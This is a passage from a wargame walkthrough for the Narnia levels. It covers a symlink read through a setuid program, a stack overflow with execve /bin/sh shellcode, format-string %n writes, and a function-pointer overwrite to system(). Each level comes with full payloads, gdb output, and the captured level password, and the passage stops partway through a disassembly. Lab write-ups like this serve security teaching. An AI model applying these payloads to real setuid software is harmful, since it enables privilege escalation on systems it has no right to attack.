+narnia3@narnia:/tmp/tanq$ cat readfile
+narnia3@narnia:/tmp/tanq$ /narnia/narnia3 /tmp/tanq/aaaaaaaaaaaaaaaaaaaaa/readfile
+error opening readfile                     &lt;--------------- error as wrong permissions
+narnia3@narnia:/tmp/tanq$ chmod 777 readfile
+narnia3@narnia:/tmp/tanq$ /narnia/narnia3 /tmp/tanq/aaaaaaaaaaaaaaaaaaaaa/readfile
+copied contents of /tmp/tanq/aaaaaaaaaaaaaaaaaaaaa/readfile to a safer place... (readfile)
+narnia3@narnia:/tmp/tanq$ cat readfile
+this is to be read
+</div></code></code></pre>
+<p>Now the file which is being read can be made a link to the password of narnia4 as the program is a setuid and can read the file. Then the same method can be used to get the file. this does give a bit of junk data but the first line is the password and that is all that is required.</p>
+<pre><code><code><div>narnia3@narnia:/tmp/tanq$ cd aaaaaaaaaaaaaaaaaaaaa/
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ rm readfile
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ ln -s /etc/narnia_pass/narnia4 readfile
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ ls -l
+total 0
+lrwxrwxrwx 1 narnia3 root 24 May  4 12:36 readfile -&gt; /etc/narnia_pass/narnia4
+narnia3@narnia:/tmp/tanq/aaaaaaaaaaaaaaaaaaaaa$ cd ..
+narnia3@narnia:/tmp/tanq$ rm readfile
+narnia3@narnia:/tmp/tanq$ touch readfile
+narnia3@narnia:/tmp/tanq$ chmod 777 readfile
+narnia3@narnia:/tmp/tanq$ /narnia/narnia3 /tmp/tanq/aaaaaaaaaaaaaaaaaaaaa/readfile
+copied contents of /tmp/tanq/aaaaaaaaaaaaaaaaaaaaa/readfile to a safer place... (readfile)
+narnia3@narnia:/tmp/tanq$ cat readfile
+thaenohtai
+(. PD    narnia3@narnia:/tmp/tanq$
+</div></code></code></pre>
+<p>Therefore, the password is - <code>thaenohtai</code>.</p>
+<hr>
+<h3 id="narnia4">Narnia4</h3>
+<p>The code for <code>narnia4.c</code> is as follows -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span>
+<span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> **argv)</span></span>{
+    <span class="hljs-keyword">int</span> i;
+    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">256</span>];
+    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; environ[i] != <span class="hljs-literal">NULL</span>; i++)
+        <span class="hljs-built_in">memset</span>(environ[i], <span class="hljs-string">'\0'</span>, <span class="hljs-built_in">strlen</span>(environ[i]));
+    <span class="hljs-keyword">if</span>(argc&gt;<span class="hljs-number">1</span>)
+        <span class="hljs-built_in">strcpy</span>(buffer,argv[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></code></pre>
+<p>Looking at the code, we know we have a buffer and a loop that sets all environment variables to nulls or delimiters or empty strings. Therefore, the only attack vector here is to alter the return address of the only function i.e., main. The return stetment is the one we need to look for. The variable that can be overflowed is buffer. Therefore, we can disassemble the code and have a look as well as try overflowing and finding the exact value at which the function gives a seg fault with the overflowed valued. This will be the threshold of the buffer overflow as at that point the return pointer gets overwritten.</p>
+<pre><code><code><div>narnia4@narnia:/narnia$ gdb -q narnia4
+Reading symbols from narnia4...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484ab &lt;+0&gt;:     push   ebp
+   0x080484ac &lt;+1&gt;:     mov    ebp,esp
+   0x080484ae &lt;+3&gt;:     sub    esp,0x104
+   0x080484b4 &lt;+9&gt;:     mov    DWORD PTR [ebp-0x4],0x0
+   0x080484bb &lt;+16&gt;:    jmp    0x80484f6 &lt;main+75&gt;
+   0x080484bd &lt;+18&gt;:    mov    eax,ds:0x80497d4
+   0x080484c2 &lt;+23&gt;:    mov    edx,DWORD PTR [ebp-0x4]
+   0x080484c5 &lt;+26&gt;:    shl    edx,0x2
+   0x080484c8 &lt;+29&gt;:    add    eax,edx
+   0x080484ca &lt;+31&gt;:    mov    eax,DWORD PTR [eax]
+   0x080484cc &lt;+33&gt;:    push   eax
+   0x080484cd &lt;+34&gt;:    call   0x8048370 &lt;strlen@plt&gt;
+   0x080484d2 &lt;+39&gt;:    add    esp,0x4
+   0x080484d5 &lt;+42&gt;:    mov    ecx,eax
+   0x080484d7 &lt;+44&gt;:    mov    eax,ds:0x80497d4
+   0x080484dc &lt;+49&gt;:    mov    edx,DWORD PTR [ebp-0x4]
+   0x080484df &lt;+52&gt;:    shl    edx,0x2
+   0x080484e2 &lt;+55&gt;:    add    eax,edx
+   0x080484e4 &lt;+57&gt;:    mov    eax,DWORD PTR [eax]
+   0x080484e6 &lt;+59&gt;:    push   ecx
+   0x080484e7 &lt;+60&gt;:    push   0x0
+   0x080484e9 &lt;+62&gt;:    push   eax
+   0x080484ea &lt;+63&gt;:    call   0x8048390 &lt;memset@plt&gt;
+   0x080484ef &lt;+68&gt;:    add    esp,0xc
+   0x080484f2 &lt;+71&gt;:    add    DWORD PTR [ebp-0x4],0x1
+   0x080484f6 &lt;+75&gt;:    mov    eax,ds:0x80497d4
+   0x080484fb &lt;+80&gt;:    mov    edx,DWORD PTR [ebp-0x4]
+   0x080484fe &lt;+83&gt;:    shl    edx,0x2
+   0x08048501 &lt;+86&gt;:    add    eax,edx
+   0x08048503 &lt;+88&gt;:    mov    eax,DWORD PTR [eax]
+   0x08048505 &lt;+90&gt;:    test   eax,eax
+   0x08048507 &lt;+92&gt;:    jne    0x80484bd &lt;main+18&gt;
+   0x08048509 &lt;+94&gt;:    cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804850d &lt;+98&gt;:    jle    0x8048527 &lt;main+124&gt;
+   0x0804850f &lt;+100&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+   0x08048512 &lt;+103&gt;:   add    eax,0x4
+   0x08048515 &lt;+106&gt;:   mov    eax,DWORD PTR [eax]
+   0x08048517 &lt;+108&gt;:   push   eax
+   0x08048518 &lt;+109&gt;:   lea    eax,[ebp-0x104]
+   0x0804851e &lt;+115&gt;:   push   eax
+   0x0804851f &lt;+116&gt;:   call   0x8048360 &lt;strcpy@plt&gt;
+   0x08048524 &lt;+121&gt;:   add    esp,0x8
+   0x08048527 &lt;+124&gt;:   mov    eax,0x0
+   0x0804852c &lt;+129&gt;:   leave
+   0x0804852d &lt;+130&gt;:   ret
+End of assembler dump.
+(gdb) r $(python -c 'print(&quot;A&quot;*268)')
+Starting program: /narnia/narnia4 $(python -c 'print(&quot;A&quot;*268)')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) i r
+eax            0x0      0
+ecx            0xffffd8a0       -10080
+edx            0xffffd5c0       -10816
+ebx            0x0      0
+esp            0xffffd5c0       0xffffd5c0
+ebp            0x41414141       0x41414141
+esi            0x2      2
+edi            0xf7fc5000       -134459392
+eip            0x41414141       0x41414141
+eflags         0x10296  [ PF AF SF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+(gdb) x/85wx $esp+400
+0xffffd750:     0xffffd77b      0x00000000      0x00000000      0x00000000
+0xffffd760:     0x00000000      0x00000000      0x2e000000      0x65e84b64
+0xffffd770:     0x4863725b      0x0771dba7      0x69f4c786      0x00363836
+0xffffd780:     0x00000000      0x72616e2f      0x2f61696e      0x6e72616e
+0xffffd790:     0x00346169      0x41414141      0x41414141      0x41414141
+0xffffd7a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd7b0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd7c0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd7d0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd7e0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd7f0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd800:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd810:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd870:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd880:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd890:     0x41414141      0x41414141      0x41414141      0x41414141    &lt;-------- the return address is located at this address
+0xffffd8a0:     0x00000000
+</div></code></code></pre>
+<p>Therefore, we find the length of the buffer threshold to be 268, where the last 4 bytes are the required return address. So, we can simply overflow this by redirecting program control like in Narnia2 by using the same 25 byte dash shell code. The return address can be a place in the NOP sled and since we have a big buffer, this can be conveniently placed in the middle of the 0x41414141's. Therefore, the payload will be as follows -</p>
+<pre><code><code><div>$(python -c 'print(&quot;\x90&quot;*239 +
+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;
++ &quot;\xe4\xd7\xff\xff&quot;)')
+</div></code></code></pre>
+<p>Running this on the shell gives the following -</p>
+<pre><code><code><div>narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print(&quot;\x90&quot;*239
++ &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot; 
++ &quot;\xe4\xd7\xff\xff&quot;)')
+$ whoami
+narnia5
+$ cat /etc/narnia_pass/narnia5
+faimahchiy
+</div></code></code></pre>
+<p>Thus, the password for this level is <code>faimahchiy</code>.</p>
+<hr>
+<h3 id="narnia5">Narnia5</h3>
+<p>The code for narnia5.c contains -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>{
+        <span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;
+        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">64</span>];
+        <span class="hljs-built_in">snprintf</span>(buffer, <span class="hljs-keyword">sizeof</span> buffer, argv[<span class="hljs-number">1</span>]);
+        buffer[<span class="hljs-keyword">sizeof</span> (buffer) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change i's value from 1 -&gt; 500. "</span>);
+        <span class="hljs-keyword">if</span>(i==<span class="hljs-number">500</span>){
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"GOOD\n"</span>);
+        setreuid(geteuid(),geteuid());
+                system(<span class="hljs-string">"/bin/sh"</span>);
+        }
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"No way...let me give you a hint!\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"buffer : [%s] (%d)\n"</span>, buffer, <span class="hljs-built_in">strlen</span>(buffer));
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"i = %d (%p)\n"</span>, i, &amp;i);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></code></pre>
+<p>From the code, it is apparent that we need to overflow somewhere to change the value of a variable and thus get a particular code snippet executed. The setreuid function sets the real uid to the effective uid, which is obtained from the geteuid method. <code>system</code> has a vulnerability of not dropping privileges and thus, the setreuid will keep the reuid of the current user as root before shifting control to the system syscall. This is solved in <code>execve</code>. However, for this challenge, this is to be exploited using a vulnerability.</p>
+<p>We see that the function used to copy data into buffer is snprintf. This is a class of the printf functions and also checks the size of the buffer it is writing to. Therefore, we cannot write more than 64 bytes. However, snprintf, being a part of printf family, is vulnerable to format string attack when the data related is controlled by the attacker. In this case, the data in buffer is controlled by us since it is copied from the argument.</p>
+<p>The goal is to change the value of <code>i</code> to 500 so that the system can be executed. We start by checking for the format string attack by using a bunch of '%p' as the input.</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;AAAA%x%x%x%x&quot;)')
+Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+buffer : [AAAA41414141313431343134313434333133] (36)
+i = 1 (0xffffd6e0)
+</div></code></code></pre>
+<p>Printf (or snprintf), when given a %x without any argument passed in place of that format string, prints directly from the stack. Therefore, we try entering 'AAAA' for easy location and then when we try to print the stack, the first value that gets printed is 0x41414141. This means that upon printing the values of the stack, we find the value we passed as the argument right at the first address that printf prints. Thus, to print only that value, we can use the format specifier of %1$x, where 1 signifies first entry.</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;AAAA%1$x&quot;)')
+Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+buffer : [AAAA41414141] (12)
+i = 1 (0xffffd6e0)
+</div></code></code></pre>
+<p>Another interesting construct of the printf family is the <code>%n</code> format specifier. This writes a value to the address specified. This value is equal to the number of characters written till now in the stack. Following this -</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;AAAA%1$n&quot;)')
+Segmentation fault
+</div></code></code></pre>
+<p>On doing this, the program gives a Segmentation fault because, the payload above instructs the program to write a value of 4 (number of bytes written for AAAA) to the address 0x41414141, which is specified by the %1$ part of the format string. Since the address 0x41414141 does not exist, the program gives a seg fault. Therefore, we need to change the value of the variable i. For this, we must locate the address of i. This is given as a hint at every execution, otherwise gdb/objdump must be used to obtain the required address from the stack. If we try to change the value of i now by specifying the address of i instead of AAAA, -</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;\xe0\xd6\xff\xff%1$n&quot;)')
+Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+buffer : [] (4)
+i = 4 (0xffffd6e0)
+</div></code></code></pre>
+<p>We see that we successfully changed the value of i. But we need to change it to 500 and not 4. Therefore, we need to add more data to make it so. The value gets changed to 4 as the amount of data written to the stack is calculated to be 4 bytes for the address that's written. This cannot be done with simple data as then the buffer will be completely written with the data and the required address will not be considered. Therefore, we need to make printf print more data instead of writing extra data onto the stack. Even if we wrote data on the stack, the variable buffer cannot be overflowed. Its the data printed by printf that is overflowed. Therefore, this can be done by using %x to print data.</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;\xe0\xd6\xff\xff&quot; + &quot;%x&quot; + &quot;%1$n&quot;)')
+Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+buffer : [ffffd6e0] (12)
+i = 12 (0xffffd6e0)
+</div></code></code></pre>
+<p>Therefore, in the above way, the value gets changed to 12 as %x prints the next address on the stack in hex format i.e., 8 characters. Therefore, the address plus the formatted address is 4 + 8 = 12. We can pad the data printed by %x with spaces or any other character that we print. This will essentially fill the space in the buffer but not by writing from user but because of the printf trying to print it out.</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;\xe0\xd6\xff\xff&quot; + &quot;%10x&quot; + &quot;%1$n&quot;)')
+Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+buffer : [  ffffd6e0] (14)
+i = 14 (0xffffd6e0)
+</div></code></code></pre>
+<p>Clearly, this padding of 2 characters to make it print in 10 characters changes the value of i from 12 to 14. Therefore, if we pad to make it 496 characters long, then the addition with the 4 bytes of the address will make the sum 500. This is done as follows -</p>
+<pre><code><code><div>narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print(&quot;\xe0\xd6\xff\xff%496x%1$n&quot;)')
+Change i's value from 1 -&gt; 500. GOOD
+$ whoami
+narnia6
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+</div></code></code></pre>
+<p>Thus, the password of narnia6 is <code>neezocaeng</code>.</p>
+<hr>
+<h3 id="narnia6">Narnia6</h3>
+<p>The code contained in narnia6.c is as follows -</p>
+<pre><code><code><div>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+extern char **environ;
+// tired of fixing values...
+// - morla
+unsigned long get_sp(void) {
+       __asm__(&quot;movl %esp,%eax\n\t&quot;
+               &quot;and $0xff000000, %eax&quot;
+               );
+}
+int main(int argc, char *argv[]){
+        char b1[8], b2[8];
+        int  (*fp)(char *)=(int(*)(char *))&amp;puts, i;
+        if(argc!=3){ printf(&quot;%s b1 b2\n&quot;, argv[0]); exit(-1); }
+        for(i=0; environ[i] != NULL; i++)
+                memset(environ[i], '\0', strlen(environ[i]));
+        for(i=3; argv[i] != NULL; i++)
+                memset(argv[i], '\0', strlen(argv[i]));
+        strcpy(b1,argv[1]);
+        strcpy(b2,argv[2]);
+        //if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)
+        if(((unsigned long)fp &amp; 0xff000000) == get_sp())
+                exit(-1);
+        setreuid(geteuid(),geteuid());
+        fp(b1);
+        exit(1);
+}
+</div></code></code></pre>
+<p>The code consists of a definition of a function pointer fp which basically maps to the address of puts. Therefore, when the function is called, puts will actually be executed. The program then nullifies extra arguments and the environment variables, then copies the values of the buffers into variables b1 and b2, which can be overflowed by the looks of the program. Then a check function is called after which the reuid is set to the euid for the user and fp is called on the variable b1 i.e., puts is called for the buffer b1.
+The disassembly of the code is as follows -</p>
+<pre><code><code><div>narnia6@narnia:/narnia$ gdb -q narnia6
+Reading symbols from narnia6...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485a8 &lt;+0&gt;:     push   ebp
+   0x080485a9 &lt;+1&gt;:     mov    ebp,esp
+   0x080485ab &lt;+3&gt;:     push   ebx
+   ........
+   0x0804860c &lt;+100&gt;:   call   0x8048480 &lt;memset@plt&gt;
+   0x08048611 &lt;+105&gt;:   add    esp,0xc
+   ........
+   0x08048665 &lt;+189&gt;:   call   0x8048480 &lt;memset@plt&gt;
+   0x0804866a &lt;+194&gt;:   add    esp,0xc
+   ........
+   0x08048693 &lt;+235&gt;:   call   0x8048420 &lt;strcpy@plt&gt;
+   0x08048698 &lt;+240&gt;:   add    esp,0x8
+   ........
+   0x080486a8 &lt;+256&gt;:   call   0x8048420 &lt;strcpy@plt&gt;
+   0x080486ad &lt;+261&gt;:   add    esp,0x8
+   0x080486b0 &lt;+264&gt;:   mov    eax,DWORD PTR [ebp-0xc]
+   0x080486b3 &lt;+267&gt;:   and    eax,0xff000000
+   0x080486b8 &lt;+272&gt;:   mov    ebx,eax
+   0x080486ba &lt;+274&gt;:   call   0x804859b &lt;get_sp&gt;
+   0x080486bf &lt;+279&gt;:   cmp    ebx,eax
+   0x080486c1 &lt;+281&gt;:   jne    0x80486ca &lt;main+290&gt;
+   0x080486c3 &lt;+283&gt;:   push   0xffffffff
+   0x080486c5 &lt;+285&gt;:   call   0x8048440 &lt;exit@plt&gt;
+   0x080486ca &lt;+290&gt;:   call   0x8048410 &lt;geteuid@plt&gt;
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+   0x080486cf &lt;+295&gt;:   mov    ebx,eax
+   0x080486d1 &lt;+297&gt;:   call   0x8048410 &lt;geteuid@plt&gt;
+   0x080486d6 &lt;+302&gt;:   push   ebx
+   0x080486d7 &lt;+303&gt;:   push   eax
+   0x080486d8 &lt;+304&gt;:   call   0x8048450 &lt;setreuid@plt&gt;
+   0x080486dd &lt;+309&gt;:   add    esp,0x8
+   0x080486e0 &lt;+312&gt;:   lea    eax,[ebp-0x14]
+   0x080486e3 &lt;+315&gt;:   push   eax
+   0x080486e4 &lt;+316&gt;:   mov    eax,DWORD PTR [ebp-0xc]
+   0x080486e7 &lt;+319&gt;:   call   eax                        &lt;--------------- call to an address (fp)
+   0x080486e9 &lt;+321&gt;:   add    esp,0x4
+   0x080486ec &lt;+324&gt;:   push   0x1
+   0x080486ee &lt;+326&gt;:   call   0x8048440 &lt;exit@plt&gt;
+End of assembler dump.
+</div></code></code></pre>
+<p>Looking at the disassembly of the code and following through the code, the 4th last line is where the function fp is called. This can be checked by looking at the call statement being made to eax register after the geteuid and setreuid methods. The value in eax is given by the mov statement above this. To check the stack behavior now, we put a breakpoint at the exit statement right after the call to fp and then proceed to look at the stack.</p>
+<pre><code><code><div>(gdb) b *main+326
+Breakpoint 1 at 0x80486ee
+(gdb) r AAAA BBBB
+Starting program: /narnia/narnia6 AAAA BBBB
+AAAA
+Breakpoint 1, 0x080486ee in main ()
+(gdb) i r
+eax            0x5      5
+ecx            0xfbad0084       -72548220
+edx            0xf7fc6870       -134453136
+ebx            0x36b6   14006
+esp            0xffffd698       0xffffd698
+ebp            0xffffd6b8       0xffffd6b8
+esi            0x3      3
+edi            0xf7fc5000       -134459392
+eip            0x80486ee        0x80486ee &lt;main+326&gt;
+eflags         0x286    [ PF SF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+(gdb) x/10wx $esp
+0xffffd698:     0x00000001      0x42424242      0xf7fc5300      0x41414141
+0xffffd6a8:     0x08048700      0x08048430      0x00000003      0x00000000
+0xffffd6b8:     0x00000000      0xf7e2a286
+(gdb) x $ebp-0xc
+0xffffd6ac:     0x08048430
+(gdb) x 0x08048430
+0x8048430 &lt;puts@plt&gt;:   0x99c825ff
+</div></code></code></pre>
+<p>We see that on printing the stack, we can locate the variable positions as b2, then b1 followed by fp. We can locate fp by examining the location ebp-0xc, the contents of which were moved into the eax register. This gives us the address which is located 8 bytes after the start of b1. Upon examining the address, we see it is in fact 'puts' itself, which confirms that the function fp is at that address. Therefore, if we can change the address of fp to some other function, we can force a shell. A viable option is the system function which behaves well with the given construct of setreuid and geteuid. Since the buffer locations are also known, they can be used to overflow the stack and thus change the address of fp to system. To get the address of system, we can print using gdb as follows -</p>
+<pre><code><code><div>(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xf7e4c850 &lt;system&gt;
+</div></code></code></pre>
+<p>Now that we have the address of system, we can overwrite the buffers such that b1 holds <code>/bin/sh</code> and fp address holds system address.</p>
+<pre><code><code><div>narnia6@narnia:/narnia$ ./narnia6 $(python -c 'print(&quot;/bin/sh;&quot; + &quot;\x50\xc8\xe4\xf7&quot;)') BBBB
+$ whoami
+narnia7
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
+</div></code></code></pre>
+<p>Thus, the password for narnia7 is <code>ahkiaziphu</code>.</p>
+<hr>
+<h3 id="narnia7">Narnia7</h3>
+<p>The code for narnia7.c contains -</p>
+<pre><code class="language-c"><div><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">goodfunction</span><span class="hljs-params">()</span></span>;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hackedfunction</span><span class="hljs-params">()</span></span>;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format)</span></span>{
+        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">128</span>];
+        <span class="hljs-keyword">int</span> (*ptrf)();
+        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buffer));
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"goodfunction() = %p\n"</span>, goodfunction);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hackedfunction() = %p\n\n"</span>, hackedfunction);
+        ptrf = goodfunction;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"before : ptrf() = %p (%p)\n"</span>, ptrf, &amp;ptrf);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"I guess you want to come to the hackedfunction...\n"</span>);
+        sleep(<span class="hljs-number">2</span>);
+        ptrf = goodfunction;
+        <span class="hljs-built_in">snprintf</span>(buffer, <span class="hljs-keyword">sizeof</span> buffer, format);
+        <span class="hljs-keyword">return</span> ptrf();
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>{
+        <span class="hljs-keyword">if</span> (argc &lt;= <span class="hljs-number">1</span>){
+                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Usage: %s &lt;buffer&gt;\n"</span>, argv[<span class="hljs-number">0</span>]);
+                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+        }
+        <span class="hljs-built_in">exit</span>(vuln(argv[<span class="hljs-number">1</span>]));
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">goodfunction</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome to the goodfunction, but i said the Hackedfunction..\n"</span>);
+        fflush(<span class="hljs-built_in">stdout</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hackedfunction</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Way to go!!!!"</span>);
+            fflush(<span class="hljs-built_in">stdout</span>);
+        setreuid(geteuid(),geteuid());
+        system(<span class="hljs-string">"/bin/sh"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></code></pre>
+<p>After reading the code above, we see that the main function calls the vuln function with a command line argument as its argument. Inside the vuln function, the program clears the defined buffer, defines a function pointer, and prints the addresses for the goodfunction and the hackedfunction (for ease). Upon examining the two functions stated, it is clear that the goal is to somehow execute the hackedfunction such that the shell is spawned using system. By examining the code, we see that the snprintf call in vuln is a point of format string attack execution. The function vuln has a return statement which returns the function pointed by prtf. This function pointer has been set to the address to the address of goodfunction, and the goal is to change the address to that of hackedfunction.</p>
+<p>Therefore, we disassemble the function vuln and examine the contents of stack using format string specifiers, to check for the required data.</p>
+<pre><code><code><div>narnia7@narnia:/narnia$ gdb -q narnia7
+Reading symbols from narnia7...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x0804861b &lt;+0&gt;:     push   ebp
+   0x0804861c &lt;+1&gt;:     mov    ebp,esp
+   0x0804861e &lt;+3&gt;:     sub    esp,0x84
+   0x08048624 &lt;+9&gt;:     push   0x80
+   0x08048629 &lt;+14&gt;:    push   0x0
+   0x0804862b &lt;+16&gt;:    lea    eax,[ebp-0x80]
+   0x0804862e &lt;+19&gt;:    push   eax
+   0x0804862f &lt;+20&gt;:    call   0x80484f0 &lt;memset@plt&gt;
+   0x08048634 &lt;+25&gt;:    add    esp,0xc
+   0x08048637 &lt;+28&gt;:    push   0x80486ff
+   0x0804863c &lt;+33&gt;:    push   0x80487f0
+   0x08048641 &lt;+38&gt;:    call   0x8048450 &lt;printf@plt&gt;
+   0x08048646 &lt;+43&gt;:    add    esp,0x8
+   0x08048649 &lt;+46&gt;:    push   0x8048724
+   0x0804864e &lt;+51&gt;:    push   0x8048805
+   0x08048653 &lt;+56&gt;:    call   0x8048450 &lt;printf@plt&gt;
+   0x08048658 &lt;+61&gt;:    add    esp,0x8
+   0x0804865b &lt;+64&gt;:    mov    DWORD PTR [ebp-0x84],0x80486ff
+   0x08048665 &lt;+74&gt;:    mov    eax,DWORD PTR [ebp-0x84]
+   0x0804866b &lt;+80&gt;:    lea    edx,[ebp-0x84]
+   0x08048671 &lt;+86&gt;:    push   edx
+   0x08048672 &lt;+87&gt;:    push   eax
+   0x08048673 &lt;+88&gt;:    push   0x804881d
+   0x08048678 &lt;+93&gt;:    call   0x8048450 &lt;printf@plt&gt;
+   0x0804867d &lt;+98&gt;:    add    esp,0xc
